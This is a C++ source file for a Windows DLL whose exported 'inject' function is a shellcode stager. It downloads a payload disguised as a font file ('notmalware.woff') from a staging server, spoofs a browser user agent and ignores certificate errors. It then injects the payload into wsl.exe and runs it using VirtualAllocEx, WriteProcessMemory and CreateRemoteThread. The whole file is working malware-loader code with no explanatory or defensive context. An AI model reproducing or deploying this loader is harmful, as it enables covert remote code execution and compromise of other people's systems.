#include "pch.h"
#include <vector>
#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>

#pragma comment(lib, "Winhttp.lib")

extern "C" __declspec(dllexport) void inject() {
    const wchar_t* stagingHost = L"192.168.56.1";
    INTERNET_PORT stagingPort = 8443;
    const wchar_t* stagingFile = L"notmalware.woff";


    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL) {
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, stagingHost, stagingPort, 0);
    if (hConnect == NULL) {
        CloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", stagingFile, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (hRequest == NULL) {
        CloseHandle(hSession);
        CloseHandle(hConnect);
        return;
    }

    

    bool retry;
    do {
        retry = false;

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, NULL)) {

            DWORD error = GetLastError();
            if (error == ERROR_WINHTTP_SECURE_FAILURE) {
                DWORD dwFlags =
                    SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

                if (WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
                    retry = true;
                }
            }
            else if (error == ERROR_WINHTTP_RESEND_REQUEST) {
                retry = true;
            }
            else if (error == ERROR_WINHTTP_TIMEOUT) {
                Sleep(60000);
                retry = true;
            }
        }
    } while (retry);


    bool bResponse = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResponse) {
        CloseHandle(hSession);
        CloseHandle(hConnect);
        CloseHandle(hRequest);
        return;
    }

    DWORD dwSize;
    DWORD dwTotalSize;
    LPSTR buf;
    std::vector<unsigned char> shellcode_vec;
    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            goto cleanup;
            return;
        }

        buf = new char[dwSize];
        if (!buf) {
            goto cleanup;
            return;
        }

        ZeroMemory(buf, dwSize);
        if (!WinHttpReadData(hRequest, (LPVOID)buf, dwSize, &dwTotalSize)) {
            delete[] buf;
            goto cleanup;
            return;
        }

        shellcode_vec.insert(shellcode_vec.end(), buf, buf + dwSize);

        delete[] buf;
    } while (dwSize > 0);
    cleanup:
		CloseHandle(hSession);
		CloseHandle(hConnect);
		CloseHandle(hRequest);

    unsigned char* shellcode = new unsigned char[shellcode_vec.size()];
    std::copy(shellcode_vec.begin(), shellcode_vec.end(), shellcode);

    size_t shellcode_size = shellcode_vec.size();

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        return;
    }

    std::wstring targetProcess = L"wsl.exe";
    DWORD targetPID = NULL;
    do {
        
        if (targetProcess == pe32.szExeFile) {
            targetPID = pe32.th32ProcessID;
        }

    } while (Process32Next(hProcessSnap, &pe32));
    if (targetPID == NULL) {
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        return;
    }

    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcode_size, NULL)) {
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        CloseHandle(hProcess);
        return;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
